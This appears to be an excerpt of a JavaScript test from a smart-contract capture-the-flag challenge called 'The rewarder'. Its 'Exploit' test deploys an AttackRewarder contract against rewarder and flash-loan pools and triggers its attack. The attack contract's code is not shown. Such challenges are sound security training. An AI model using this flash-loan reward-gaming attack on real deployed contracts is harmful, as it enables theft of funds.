...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        const attackContractFactory = await ethers.getContractFactory('AttackRewarder', attacker);
        const attackContract = await attackContractFactory.deploy(this.rewarderPool.address, this.flashLoanPool.address, this.liquidityToken.address, this.rewardToken.address);

        attackContract.connect(attacker).attack(TOKENS_IN_LENDER_POOL);
    });
